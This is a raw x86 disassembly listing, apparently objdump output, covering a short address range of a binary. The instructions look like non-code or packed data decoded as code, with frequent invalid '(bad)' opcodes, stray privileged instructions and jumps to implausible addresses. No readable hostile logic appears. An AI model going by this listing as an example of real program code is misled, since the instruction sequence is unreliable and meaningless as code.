  425e43:	inc    edx
  425e44:	mov    ds:0x10621a36,al
  425e4a:	lahf   
  425e4b:	jmp    0x99e3e036
  425e50:	loopne 0x425ec2
  425e52:	sbb    edx,DWORD PTR [ecx-0x3c]
  425e55:	jge    0x425e19
  425e57:	dec    ebp
  425e58:	cld    
  425e59:	arpl   WORD PTR ss:[edi],dx
  425e5c:	jge    0x425eae
  425e5e:	or     ebp,DWORD PTR [ebx-0x25]
  425e61:	jp     0x425ec9
  425e63:	mov    al,0xd4
  425e65:	int3   
  425e66:	xor    bh,BYTE PTR [eax]
  425e68:	xchg   BYTE PTR [ebx-0x54],al
  425e6b:	xor    ecx,esi
  425e6d:	sub    eax,0x5ead6a03
  425e72:	dec    ebx
  425e73:	sti    
  425e74:	push   0x614fc1
  425e79:	sbb    al,dl
  425e7b:	data16 lahf 
  425e7d:	xchg   ecx,eax
  425e7e:	arpl   WORD PTR [esi-0x2d],dx
  425e81:	fisubr WORD PTR [esi-0x32]
  425e84:	pop    es
  425e85:	add    bl,BYTE PTR [edi+0x2]
  425e88:	sbb    eax,0x51bda15e
  425e8d:	mov    al,0xe0
  425e8f:	iret   
  425e90:	nop
  425e91:	lods   eax,DWORD PTR ds:[esi]
  425e92:	arpl   WORD PTR [edi-0x7f],dx
  425e95:	xor    DWORD PTR [eax+0x1ddc04b9],0x2e66b8e7
  425e9f:	cld    
  425ea0:	inc    ebp
  425ea1:	push   es
  425ea2:	sbb    eax,0x70cb120d
  425ea7:	enter  0x3445,0x1b
  425eab:	out    0xb2,al
  425ead:	mov    bh,BYTE PTR [ebx-0x211bfd0f]
  425eb3:	pusha  
  425eb4:	stc    
  425eb5:	ins    DWORD PTR es:[edi],dx
  425eb6:	or     BYTE PTR [eax+0x2d],bl
  425eb9:	jmp    0x425e6e
  425ebb:	and    BYTE PTR [ebx+0xce61dee],dl
  425ec1:	sbb    al,0xd3
  425ec3:	mov    ds:0xff271e73,al
  425ec8:	xor    esi,DWORD PTR [eax-0x17a1ef3b]
  425ece:	push   ebx
  425ecf:	xor    eax,0x75e1204e
  425ed4:	dec    ebx
  425ed5:	test   eax,0x3ca8f0c0
  425eda:	or     edi,DWORD PTR [edi-0x19]
  425edd:	xchg   esi,eax
  425ede:	lds    ebx,FWORD PTR [edx]
  425ee0:	cmc    
  425ee1:	jo     0x425edb
  425ee3:	or     BYTE PTR [ecx+edi*4],ah
  425ee6:	out    dx,eax
  425ee7:	cmc    
  425ee8:	aas    
  425ee9:	dec    ecx
  425eea:	pop    eax
  425eeb:	push   ecx
  425eec:	xchg   edx,eax
  425eed:	lea    esp,cs:[esi]
  425ef0:	xchg   edx,eax
  425ef1:	inc    esp
  425ef2:	stos   DWORD PTR es:[edi],eax
  425ef3:	adc    ah,BYTE PTR [ecx+0x4ce51079]
  425ef9:	lods   eax,DWORD PTR ds:[esi]
  425efa:	dec    edx
  425efb:	fwait
  425efc:	test   DWORD PTR [edi-0x3f],ecx
  425eff:	sub    eax,ecx
  425f01:	cmp    al,0xc8
  425f03:	imul   ebx,DWORD PTR [ecx-0x6a],0x38
  425f07:	mov    bl,0x7
  425f09:	jno    0x425ed3
  425f0b:	ds in  al,dx
  425f0d:	mov    ecx,0xe3d6e2a4
  425f12:	pusha  
  425f13:	sbb    edx,DWORD PTR [ebp-0x3d]
  425f16:	(bad)  [ecx*8-0x5aea3bdb]
  425f1d:	jo     0x425f4d
  425f1f:	add    eax,0x2813de6e
  425f24:	push   eax
  425f25:	cmp    BYTE PTR [edx],al
  425f27:	or     eax,0x7dc8b307
  425f2c:	not    BYTE PTR [edi+0x0]
	...
  425f37:	add    BYTE PTR [eax],al
  425f39:	add    BYTE PTR [edx],cl
  425f3b:	xchg   edx,eax
  425f3c:	jl     0x425f77
  425f3e:	cld    
  425f3f:	dec    DWORD PTR [edi-0x4d]
  425f42:	or     DWORD PTR [eax+eax*1],ebp
  425f45:	sub    ebp,DWORD PTR [esi+0x13]
  425f48:	mov    ds:0x1d66073,eax
  425f4d:	add    ah,bh
  425f4f:	add    DWORD PTR [eax],eax
  425f51:	add    cl,cl
  425f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f54:	lahf   
  425f55:	mov    ah,0xf
  425f57:	and    bl,BYTE PTR [edx-0x25]
  425f5a:	cmc    
  425f5b:	push   esi
  425f5c:	lock mov ah,0x62
  425f5f:	sbb    al,0x40
  425f62:	push   cs
  425f63:	mov    ch,0xdf
  425f65:	dec    edi
  425f66:	push   0x8a8df7f8
  425f6b:	xor    bl,BYTE PTR gs:[ecx]
  425f6e:	outs   dx,DWORD PTR ds:[esi]
  425f6f:	bound  eax,QWORD PTR [esi+0x33]
  425f72:	cmp    al,0xcb
  425f74:	aaa    
  425f75:	lods   al,BYTE PTR ds:[esi]
  425f76:	hlt    
  425f77:	adc    ah,al
  425f79:	(bad)  
  425f7a:	add    edi,DWORD PTR [edx]
  425f7c:	xor    al,0xf7
  425f7e:	out    0x63,al
  425f80:	aas    
  425f81:	inc    ecx
  425f82:	rcl    DWORD PTR [ecx-0x58c0b1e9],1
  425f88:	mov    ebx,0x5aff84eb
  425f8e:	xchg   DWORD PTR [edi+0x1a],eax
  425f91:	dec    ebp
  425f92:	in     al,dx
  425f93:	int3   
  425f94:	xchg   ebx,eax
  425f95:	sbb    eax,DWORD PTR ds:0xf19b7fed
  425f9b:	jg     0x425f9c
  425f9d:	push   esp
  425f9e:	pop    eax
  425f9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425fa0:	jge    0x425f33
  425fa2:	test   BYTE PTR [ebx+edx*8+0x64],dh
  425fa6:	pop    eax
  425fa8:	in     al,0x48
  425faa:	retf   0xfca0
  425fad:	jae    0x426028
  425faf:	fisub  DWORD PTR [ecx+eiz*1-0x2e022488]
  425fb6:	aad    0xf8
  425fb8:	sbb    BYTE PTR [esi+ecx*4+0x52],ah
  425fbc:	adc    ah,ah
  425fbe:	imul   ebp,DWORD PTR ds:0x4635e226,0x48f5973
  425fc8:	sub    BYTE PTR [eax-0x19],bh
  425fcb:	inc    esp
  425fcc:	mov    edx,0xec23a84b
  425fd1:	and    esp,DWORD PTR [ecx-0x77]
  425fd4:	mov    ebp,0x1aafbcb0
  425fd9:	and    al,0xb8
  425fdb:	mov    eax,ss
  425fdd:	mov    eax,ds:0x1956cde4
  425fe2:	sbb    eax,DWORD PTR [edi+0x7e445674]
  425fe8:	outs   dx,BYTE PTR ds:[esi]
  425fe9:	push   0x6f
  425feb:	cmc    
  425fec:	xchg   DWORD PTR [edx],ecx
  425fee:	pusha  
  425fef:	add    eax,0x5db5cd48
  425ff4:	or     BYTE PTR [ecx-0xb35b45d],cl
  425ffa:	mov    esp,0xba8a2abb
  425fff:	icebp  
  426000:	mov    esi,0xf06603
  426005:	loopne 0x425fce
  426007:	dec    ebp
  426008:	ret    0xbcbf
  42600b:	inc    esi
  42600c:	mov    ds:0xe82a6319,eax
  426011:	cmp    ecx,DWORD PTR ss:[ebp+0x50232b80]
  426018:	push   esp
  426019:	add    BYTE PTR [ebp+0x75],cl
  42601c:	hlt    
  42601d:	dec    edi
  42601e:	adc    eax,esi
  426020:	xchg   ebx,eax
  426021:	xchg   ecx,eax
  426022:	pusha  
  426023:	jbe    0x426026
  426025:	push   esp
  426026:	stos   BYTE PTR es:[edi],al
  426027:	jnp    0x426092
  426029:	out    0xd7,al
  42602b:	adc    DWORD PTR [edx],edx
  42602d:	mov    WORD PTR [esi],ss
  42602f:	std    
  426030:	xchg   BYTE PTR [esi-0x4db305a4],al
  426036:	sbb    ah,cl
  426038:	pop    esi
  426039:	jae    0x42602f
  42603b:	push   eax
  42603c:	outs   dx,BYTE PTR ds:[esi]
  42603d:	pop    ds
  42603e:	mov    ah,0x5e
  426040:	cwde   
  426041:	cmp    eax,0x49d2fcc6
  426046:	(bad)  
  426047:	into   
  426048:	add    cl,BYTE PTR [esi-0xad3e241]
  42604e:	mov    esp,0x5f3ebee8
  426053:	add    esp,edx
  426055:	and    DWORD PTR [edx+eax*4+0x21],edx
  426059:	ss enter 0x8853,0xf2
  42605e:	add    edx,DWORD PTR [ebx]
  426060:	mov    esp,0x36e10a15
  426065:	std    
  426066:	stos   BYTE PTR es:[edi],al
  426067:	popf   
  426068:	adc    DWORD PTR [esp+ebp*2-0x3f],0x29e31dd8
  426070:	pop    ds
  426071:	mov    bh,0x55
  426073:	jmp    0x4260ef
  426075:	daa    
  426076:	fs sub ebx,esi
  426079:	pop    ebp
  42607a:	jae    0x426030
  42607c:	sbb    eax,0xcb9c15f8
  426081:	or     al,0x7d
  426083:	and    edx,edx
  426085:	aad    0xef
  426087:	xor    eax,0x1d6caed0
  42608c:	std    
  42608d:	pop    esp
  42608e:	mov    WORD PTR [eax-0x64003e42],ds
  426094:	xor    ecx,DWORD PTR [edx]
  426096:	sub    ebp,0x4cce3ddb
  42609c:	add    edx,esp
  42609e:	adc    ebx,ebx
  4260a0:	repnz (bad) 
  4260a2:	aam    0xae
  4260a4:	je     0x426084
  4260a6:	xchg   ebp,eax
  4260a7:	cld    
  4260a8:	push   ss
  4260a9:	sub    DWORD PTR [esi],0x29
  4260ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4260ad:	shl    DWORD PTR [edx-0x4a58caf5],1
  4260b3:	jge    0x4260c8
  4260b5:	ret    
  4260b6:	mov    bh,0x35
  4260b8:	in     eax,dx
  4260b9:	sbb    bh,BYTE PTR [ebx+edx*4+0x16fc8410]
  4260c0:	adc    al,0x60
  4260c2:	call   0x2aec:0x6d9dfc07
  4260c9:	mov    ecx,0xf6ed01df
  4260ce:	in     eax,dx
  4260cf:	sub    edi,DWORD PTR [ebx+0x39]
  4260d2:	cli    
  4260d3:	jne    0x426109
  4260d5:	jecxz  0x4260eb
  4260d7:	mov    bh,0x7
  4260d9:	aad    0xc1
  4260db:	jmp    0x6c3db173
  4260e0:	rcl    BYTE PTR [esi+0x2a5c8ec4],0x58
  4260e7:	lea    esi,[ebx-0x6e]
  4260ea:	sub    al,0x8a
  4260ec:	mov    cl,0xe3
  4260ee:	jle    0x426106
  4260f0:	mov    dl,0x45
  4260f2:	jmp    0xfc14c228
  4260f7:	(bad)  
  4260f8:	jnp    0x42607a
  4260fa:	mov    al,ds:0x5fbd6153
  4260ff:	add    cl,BYTE PTR [ecx+eax*1-0x103b26fc]
  426106:	mov    bh,0x1d
  426108:	dec    edx
  426109:	imul   ebp,edi,0x32863be0
  42610f:	jne    0x426121
  426111:	call   0xfb54c74
  426116:	in     eax,0x5c
  426118:	outs   dx,BYTE PTR ds:[esi]
  426119:	cmp    eax,0x830da537
  42611e:	xchg   edx,eax
  42611f:	jmp    0x4260a1
  426121:	push   ebp
  426122:	sub    ah,ah
  426124:	and    edi,DWORD PTR [eax]
  426126:	and    DWORD PTR [edi+0x1d],eax
  426129:	ud2    
  42612b:	out    0x60,al
  42612d:	cmp    BYTE PTR [ebx-0x49],bh
  426130:	scas   eax,DWORD PTR es:[edi]
  426131:	rol    DWORD PTR [ebx+0x22],1
  426134:	mov    bh,0x43
  426136:	xor    eax,0xb37c5488
  42613b:	xor    BYTE PTR [edi+eiz*2+0x2f],0x63
  426140:	dec    esp
  426141:	neg    BYTE PTR ds:0x74f37042
  426147:	and    dh,BYTE PTR [eax-0x16c19f1a]
  42614d:	sbb    al,BYTE PTR [eax]
	...
  426157:	add    BYTE PTR [eax],al
  426159:	add    bl,al
  42615b:	and    ecx,edx
  42615d:	dec    eax
  42615e:	repz clc 
  426160:	fld    TBYTE PTR [ebx-0x2cd29d30]
  426166:	xchg   esp,eax
  426167:	pushf  
  426168:	mov    al,ds:0x1d85c5c
  42616d:	add    ah,bh
  42616f:	add    DWORD PTR [eax],eax
  426171:	add    ah,bh
  426173:	push   eax
  426174:	mov    bl,0x33
  426176:	inc    edi
  426177:	dec    edx
  426178:	loope  0x4261f4
  42617a:	stos   DWORD PTR es:[edi],eax
  42617b:	fisttp QWORD PTR [edx-0x44]
  42617e:	cmp    BYTE PTR [edi+eiz*4+0x54],dh
  426182:	addr16 mov ds:0x2cf8,eax
  426186:	(bad)  
  426188:	into   
  426189:	outs   dx,DWORD PTR ds:[esi]
  42618a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42618b:	add    al,0x70
  42618d:	jmp    0x90b18583
  426192:	leave  
  426193:	add    bh,bh
  426195:	sti    
  426196:	add    eax,0x1282fa85
  42619b:	cs adc al,0x2e
  42619e:	mov    ebp,0x29a02d08
  4261a3:	(bad)  
  4261a4:	sbb    al,0x18
  4261a6:	and    al,0xe7
  4261a8:	fnstsw WORD PTR [eax]
  4261aa:	shl    DWORD PTR [esi-0x407dbb61],1
  4261b0:	pushf  
  4261b1:	dec    ebp
  4261b2:	cmp    DWORD PTR [ecx+0x1],ecx
  4261b5:	shr    DWORD PTR [edi-0x2c79ec63],cl
  4261bb:	(bad)  
  4261bc:	jae    0x426229
  4261be:	pop    edx
  4261bf:	jge    0x42620a
  4261c1:	jno    0x426231
  4261c3:	in     eax,dx
  4261c4:	dec    ebp
  4261c5:	aas    
  4261c6:	pop    esp
  4261c7:	out    dx,eax
  4261c8:	sbb    BYTE PTR ds:0xa6972379,cl
  4261ce:	push   esi
  4261cf:	push   es
  4261d0:	pop    esi
  4261d1:	into   
  4261d2:	jne    0x4261c1
  4261d4:	xor    al,0x13
  4261d6:	push   edi
  4261d7:	adc    DWORD PTR [esi-0x37],edi
  4261da:	ret    
  4261db:	xchg   DWORD PTR [ecx-0x32],esi
  4261de:	mov    WORD PTR [ebp-0x19968f7],?
  4261e4:	dec    eax
  4261e5:	pop    edx
  4261e6:	shr    DWORD PTR [edi],cl
  4261e8:	arpl   WORD PTR [esi-0x6e],dx
  4261eb:	xchg   edi,eax
  4261ec:	dec    ebp
  4261ed:	ret    0x2d96
  4261f0:	adc    DWORD PTR [eax+0x8],ecx
  4261f3:	push   cs
  4261f4:	push   0x53
  4261f6:	mov    dl,0xb7
  4261f8:	mov    ebp,0x30e80a26
  4261fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261fe:	mov    cl,0x12
  426200:	or     esp,DWORD PTR [ecx+esi*8]
  426203:	sub    DWORD PTR [edi+0x383f6d7e],edx
  426209:	push   ss
  42620a:	pmaxsw mm2,QWORD PTR [edi+0x71]
  42620e:	mov    edx,DWORD PTR [eax+ebx*4-0x6b]
  426212:	add    ebx,DWORD PTR [eax+0x7]
  426215:	and    bl,BYTE PTR [ebp+eiz*8+0x2f836c10]
  42621c:	std    
  42621d:	in     eax,dx
  42621e:	inc    ebx
  42621f:	and    bl,BYTE PTR [edi]
  426221:	daa    
  426222:	gs dec ebp
  426224:	out    0xb5,eax
  426226:	mov    ss,WORD PTR [edi+0x55]
  426229:	shr    al,cl
  42622b:	aam    0x2a
  42622d:	xor    eax,0xa1d7dac9
  426232:	jne    0x426284
  426234:	jmp    0xda720873
  426239:	sahf   
  42623a:	push   ds
  42623b:	push   edx
  42623c:	hlt    
  42623d:	into   
  42623e:	rcl    DWORD PTR [esi-0x39],1
  426241:	dec    esp
  426242:	xor    esi,esi
  426244:	jl     0x4261c6
  426246:	inc    edi
  426247:	jo     0x4261e5
  426249:	sub    al,0x48
  42624b:	js     0x4261d9
  42624d:	push   edi
  42624e:	and    edi,DWORD PTR [ebx+0x7f]
  426251:	dec    ecx
  426252:	in     eax,dx
  426253:	dec    ebp
  426254:	or     eax,edx
  426256:	(bad)  
  426257:	out    dx,eax
  426258:	push   edx
  426259:	jl     0x4262b8
  42625b:	in     eax,dx
  42625c:	and    al,0xa8
  42625e:	fnstcw WORD PTR [edx+eax*8]
  426261:	push   ebx
  426262:	repnz adc ebp,edx
  426265:	clts   
  426267:	mov    ecx,0x4209a29b
  42626c:	cmc    
  42626d:	cs popa 
  42626f:	add    al,0xc6
  426271:	jae    0x426277
  426273:	pusha  
  426274:	pop    ebp
  426275:	cdq    
  426276:	jl     0x426288
  426278:	mov    al,0x5a
  42627a:	mov    ds:0x81ec5fbc,eax
  42627f:	or     al,BYTE PTR [edx]
  426281:	shl    DWORD PTR [ebx+edi*4],0x91
  426285:	ins    BYTE PTR es:[edi],dx
  426286:	pop    ebx
  426287:	dec    ecx
  426288:	fimul  DWORD PTR ds:0xb60d7041
  42628e:	and    al,0xdd
  426290:	out    dx,al
  426291:	popa   
  426292:	jbe    0x426262
  426294:	out    dx,al
  426295:	inc    eax
  426296:	gs mov bl,0xd9
  426299:	pop    ss
  42629a:	ss mov bh,0x51
  42629d:	in     al,0xc8
  42629f:	icebp  
  4262a0:	or     eax,0x44629ae9
  4262a5:	adc    dl,BYTE PTR ds:0x863fc776
  4262ab:	clc    
  4262ac:	inc    edx
  4262ad:	out    0xea,al
  4262af:	les    edx,FWORD PTR [edi+eax*2+0x1e475e9c]
  4262b6:	sahf   
  4262b7:	xor    ebp,DWORD PTR [edi]
  4262b9:	and    bh,BYTE PTR [ebx+0xb]
  4262bc:	sbb    edi,DWORD PTR [edi]
  4262be:	popf   
  4262bf:	push   esp
  4262c0:	les    eax,FWORD PTR [ebx+edi*1+0x5b]
  4262c4:	sub    bh,0x15
  4262c7:	pop    esp
  4262c8:	es das 
  4262ca:	push   es
  4262cb:	test   DWORD PTR [eax-0x2f],ebx
  4262ce:	mov    esp,0x690462c0
  4262d3:	add    eax,0x6b76f695
  4262d8:	adc    ecx,DWORD PTR [esi-0x5f]
  4262db:	scas   al,BYTE PTR es:[edi]
  4262dc:	push   es
  4262dd:	test   al,0x6d
  4262df:	or     DWORD PTR [ebp-0x2e65e9b6],eax
  4262e5:	xchg   esp,eax
  4262e6:	pushf  
  4262e7:	push   esp
  4262e8:	aad    0x2a
  4262ea:	xlat   BYTE PTR ds:[ebx]
  4262eb:	sti    
  4262ec:	ins    BYTE PTR es:[edi],dx
  4262ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262ee:	rol    BYTE PTR [edi],0x76
  4262f1:	jg     0x426307
  4262f3:	pop    es
  4262f4:	sbb    BYTE PTR [ecx+0x4d],dl
  4262f7:	inc    edx
  4262f8:	(bad)  
  4262f9:	loopne 0x4262ac
  4262fb:	out    0x47,al
  4262fd:	inc    ebp
  4262fe:	sahf   
  4262ff:	mov    bl,0xd3
  426301:	xlat   BYTE PTR ds:[ebx]
  426302:	adc    ch,cl
  426304:	inc    eax
  426305:	sub    al,0xe6
  426307:	mov    al,ds:0x3fcd3d23
  42630c:	jnp    0x426375
  42630e:	in     eax,0xf
  426310:	xor    al,0xd9
  426312:	cs stc 
  426314:	imul   DWORD PTR [edi]
  426316:	mov    cl,0xe2
  426318:	fwait
  426319:	ja     0x42631f
  42631b:	pop    ebp
  42631c:	lock fs pop si
  426320:	scas   al,BYTE PTR es:[edi]
  426321:	ins    BYTE PTR es:[edi],dx
  426322:	sbb    al,BYTE PTR [ebx+0x44adde]
  426328:	stos   BYTE PTR es:[edi],al
  426329:	test   DWORD PTR [eax-0x67],ebp
  42632c:	and    al,0xc7
  42632e:	or     dl,BYTE PTR [ebp-0x27116707]
  426334:	jmp    0x95c68617
  426339:	iret   
  42633a:	xchg   BYTE PTR [ebx+0x49],bh
  42633d:	loopne 0x4262ce
  42633f:	or     bh,BYTE PTR [ebx-0x4a]
  426342:	hlt    
  426343:	sub    DWORD PTR es:[ecx+0x5bb83a85],ecx
  42634a:	loopne 0x4263a0
  42634c:	js     0x426343
  42634e:	push   edx
  42634f:	cwde   
  426350:	sbb    BYTE PTR [ebp+eiz*4+0x13],al
  426354:	cmp    esp,DWORD PTR ds:0xa0d82529
  42635a:	retf   
  42635b:	inc    esi
  42635c:	lods   eax,DWORD PTR ds:[esi]
  42635d:	and    ch,BYTE PTR [esi]
  42635f:	jmp    0x4263d8
  426361:	call   0x381f:0xffe0d717
  426368:	adc    DWORD PTR [edi+eax*1+0x2f],esi
  42636c:	retf   0x5
	...
  426377:	add    BYTE PTR [eax],al
  426379:	add    BYTE PTR [edx-0x101610a7],bl
  42637f:	call   FWORD PTR [esi-0x71a9f385]
  426385:	shl    DWORD PTR [ecx-0x11],cl
  426388:	adc    cl,BYTE PTR [edi]
  42638a:	pop    eax
  42638b:	fiadd  DWORD PTR [ecx]
  42638d:	add    ah,bh
  42638f:	add    DWORD PTR [eax],eax
  426391:	add    BYTE PTR [edx-0x562ec08c],dl
  426397:	sbb    al,0x92
  426399:	dec    ecx
  42639a:	lods   al,BYTE PTR ds:[esi]
  42639b:	jmp    ebx
  42639d:	out    0x80,eax
  42639f:	sbb    eax,0x35239768
  4263a4:	imul   edi,DWORD PTR [ecx-0x5c],0xffffffe9
  4263a8:	shl    DWORD PTR [eax-0x13],0xa1
  4263ac:	cmp    edi,DWORD PTR [esi-0x4a050ca5]
  4263b2:	or     al,0x76
  4263b4:	out    dx,eax
  4263b5:	dec    eax
  4263b6:	and    bl,BYTE PTR [edi]
  4263b8:	xor    al,0xae
  4263ba:	jb     0x4263c1
  4263bc:	push   eax
  4263bd:	add    ch,BYTE PTR [ecx+0x53]
  4263c0:	hlt    
  4263c1:	mov    BYTE PTR [esi],bh
  4263c3:	mov    eax,ds:0xaee1ea91
  4263c8:	cmp    al,0x89
  4263ca:	xor    al,0xc0
  4263cc:	(bad)  
  4263cd:	mov    esp,gs
  4263cf:	mov    dh,0x34
  4263d1:	das    
  4263d2:	es pushf 
  4263d4:	xor    ah,BYTE PTR [ebx-0xe3f48cf]
  4263da:	push   esp
  4263db:	cmp    ecx,ebp
  4263dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263de:	push   cs
  4263df:	push   ds
  4263e0:	cmp    al,0xc8
  4263e2:	addr16 push es
  4263e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263e5:	inc    esi
  4263e6:	push   ebx
  4263e7:	in     eax,dx
  4263e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263e9:	mov    dl,0x7b
  4263eb:	call   DWORD PTR [ecx-0x760f2c87]
  4263f1:	int3   
  4263f2:	add    ebx,eax
  4263f4:	mov    eax,0x7f02c4f6
  4263f9:	push   ds
  4263fa:	sub    edi,ecx
  4263fc:	ret    
  4263fd:	xchg   esi,eax
  4263fe:	jbe    0x426398
  426400:	lea    ebx,[esi+0x61]
  426403:	mov    bh,0x2
  426405:	addr16 cli 
  426407:	pop    esi
  426408:	xchg   ecx,eax
  426409:	pushf  
  42640a:	add    ebp,DWORD PTR [edx]
  42640c:	scas   al,BYTE PTR es:[edi]
  42640d:	push   edx
  42640e:	test   al,0x94
  426410:	or     eax,0x65b2c5cf
  426415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426416:	scas   al,BYTE PTR es:[edi]
  426417:	add    bl,BYTE PTR [esi]
  426419:	clc    
  42641a:	popa   
  42641b:	(bad)  
  42641c:	mov    bh,0xfe
  42641e:	and    edi,DWORD PTR [ebp+0x1]
  426421:	cwde   
  426422:	jne    0x42649e
  426424:	add    DWORD PTR [ebx*1-0x5350df5d],0xc7afd8b
  42642f:	cmp    al,0x79
  426431:	jg     0x426473
  426433:	out    dx,al
  426434:	les    eax,FWORD PTR [edx+ebp*8-0x4a949920]
  42643b:	call   0x8f76:0x9784e9b2
  426442:	jl     0x42647b
  426444:	cmp    edx,DWORD PTR [edi+0x7b]
  426447:	inc    ebx
  426448:	repz mov ebx,DWORD PTR [edi-0x63]
  42644c:	(bad)  
  42644e:	in     al,0x20
  426450:	or     BYTE PTR [eax],ch
  426452:	(bad)  
  426453:	cld    
  426454:	dec    edx
  426455:	mov    edi,0x2b71bdfd
  42645a:	sbb    DWORD PTR [eax+eiz*1],ebx
  42645d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42645e:	aad    0x5b
  426460:	aas    
  426461:	mov    edx,0x79b1d466
  426466:	cdq    
  426467:	call   0xefc5:0x5b924de3
  42646e:	lds    eax,FWORD PTR [eax-0x75]
  426471:	retf   
  426472:	dec    esi
  426473:	jne    0x4264a8
  426475:	daa    
  426476:	popf   
  426477:	aas    
  426478:	add    bh,BYTE PTR [edx+ebx*4-0x60]
  42647c:	imul   esi,DWORD PTR [esi-0x7f367330],0xffffffd7
  426483:	add    ah,BYTE PTR [eax+ebx*4+0x2ea0b92d]
  42648a:	inc    ebp
  42648b:	fwait
  42648c:	or     al,cl
  42648e:	fdivr  QWORD PTR [edx]
  426490:	out    dx,al
  426491:	adc    eax,0x61cd59c6
  426496:	mov    al,ds:0x2b8a4932
  42649b:	cmp    BYTE PTR [ebp+ebx*1+0x6970b29b],dl
  4264a2:	mov    dl,0x2d
  4264a4:	loopne 0x426473
  4264a6:	mov    cl,0xc8
  4264a8:	(bad)  
  4264a9:	jo     0x4264e1
  4264ab:	jmp    0x426449
  4264ad:	(bad)  
  4264ae:	sub    bh,BYTE PTR [edx+ecx*1]
  4264b1:	dec    ebx
  4264b2:	sahf   
  4264b3:	ret    0xfc9b
  4264b6:	inc    edi
  4264b7:	aad    0xcc
  4264b9:	lods   eax,DWORD PTR ds:[esi]
  4264ba:	inc    esp
  4264bb:	(bad)  
  4264bc:	jo     0x4264a9
  4264be:	mov    eax,0x9ba1d5bc
  4264c3:	lahf   
  4264c4:	xor    al,0xd0
  4264c6:	popf   
  4264c7:	jg     0x42644a
  4264c9:	push   ss
  4264ca:	gs jmp 0x426475
  4264cd:	xor    DWORD PTR [edi-0x6d0de0f8],0x3ece81d9
  4264d7:	sub    al,0xcf
  4264d9:	ds jae 0x426477
  4264dc:	or     BYTE PTR [edx+0x3871559c],al
  4264e2:	out    0xe7,al
  4264e4:	int3   
  4264e5:	mov    edi,0xb11b85d4
  4264ea:	pop    edi
  4264eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264ec:	mov    ah,0x28
  4264ee:	retf   
  4264ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264f0:	inc    ebx
  4264f1:	ins    BYTE PTR es:[edi],dx
  4264f2:	sbb    eax,0x9fcec33c
  4264f7:	(bad)  
  4264f8:	retf   0x3325
  4264fb:	ret    
  4264fc:	les    eax,FWORD PTR [esi-0x4a]
  4264ff:	jmp    0xc7ebf2ca
  426504:	sub    BYTE PTR [ecx-0x46],bl
  426507:	mov    esp,0x66688300
  42650c:	cmp    eax,DWORD PTR [ebp-0x45]
  42650f:	add    al,0x4e
  426511:	fnstsw WORD PTR [esi-0x22]
  426514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426515:	mov    eax,ds:0xd285588b
  42651a:	stos   DWORD PTR es:[edi],eax
  42651b:	(bad)  
  42651c:	cmp    DWORD PTR [ebp-0x15406fab],edi
  426522:	xor    BYTE PTR [esp+eiz*4-0xc],al
  426526:	xchg   BYTE PTR [ecx+0x7c64315d],ch
  42652c:	mov    dl,0x36
  42652e:	push   ecx
  42652f:	jge    0x426572
  426531:	push   ecx
  426532:	cmp    al,ch
  426534:	sbb    cl,BYTE PTR [ebx+0x71]
  426537:	adc    bh,bh
  426539:	cli    
  42653a:	xlat   BYTE PTR ds:[ebx]
  42653b:	data16 xor BYTE PTR [edi+0x5945b705],bh
  426542:	add    al,0x2f
  426544:	mov    eax,ds:0xbc7e484
  426549:	mov    ah,0x3d
  42654b:	xor    DWORD PTR [esi-0x7a09e508],edi
  426551:	mov    ds:0x727fbe8f,eax
  426556:	add    al,0x20
  426558:	pushf  
  426559:	lea    eax,[edi-0x2b]
  42655c:	(bad)  
  42655d:	jl     0x426595
  42655f:	pop    ecx
  426560:	in     eax,dx
  426561:	ror    BYTE PTR [eax-0x23],1
  426564:	lods   al,BYTE PTR ds:[esi]
  426565:	test   DWORD PTR [eax-0x7a1331bd],eax
  42656b:	adc    ecx,DWORD PTR [ecx-0x3b]
  42656e:	hlt    
  42656f:	pop    ds
  426570:	les    edi,FWORD PTR [edi-0x34]
  426573:	mov    edi,ebp
  426575:	test   BYTE PTR [eax],0x48
  426578:	jnp    0x4265f7
  42657a:	pop    ebp
  42657b:	xchg   edx,eax
  42657c:	in     al,0xd9
  42657e:	iret   
  42657f:	and    eax,0xf324a88f
  426584:	clc    
  426585:	into   
  426586:	fild   WORD PTR [ecx+0x691a98b4]
  42658c:	inc    eax
  42658d:	xchg   esi,eax
	...
  42659a:	(bad)  
  42659b:	rol    BYTE PTR [edi],0x37
  42659e:	dec    edi
  42659f:	idiv   DWORD PTR [ebp-0x7c857b06]
  4265a5:	jg     0x4265e9
  4265a7:	addr16 adc eax,0x1dc5434
  4265ad:	add    ah,bh
  4265af:	add    DWORD PTR [eax],eax
  4265b1:	add    BYTE PTR [ebx-0x46],ch
  4265b4:	sub    DWORD PTR [edi+ebp*1],edx
  4265b7:	sub    dh,BYTE PTR [edi-0x2b]
  4265ba:	jg     0x42661c
  4265bc:	(bad)  
  4265bd:	sbb    al,bh
  4265bf:	jb     0x42659a
  4265c1:	sti    
  4265c2:	xor    dh,ch
  4265c4:	jo     0x4265e1
  4265c6:	xchg   ecx,eax
  4265c7:	ds mov edi,0x82127eb3
  4265cd:	fiadd  WORD PTR [ecx+0x4c531d35]
  4265d3:	inc    edx
  4265d4:	js     0x426614
  4265d6:	xchg   edx,eax
  4265d7:	mov    ebx,0x371ad2aa
  4265dc:	mov    WORD PTR [edi],?
  4265de:	mov    dl,0xf8
  4265e0:	pop    ds
  4265e1:	imul   ebx,esp,0x6
  4265e4:	aam    0xb3
  4265e6:	repnz sahf 
  4265e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265e9:	mov    ah,0x19
  4265eb:	cmp    cl,ah
  4265ed:	pop    edi
  4265ee:	mov    cl,0x3f
  4265f0:	jnp    0x426664
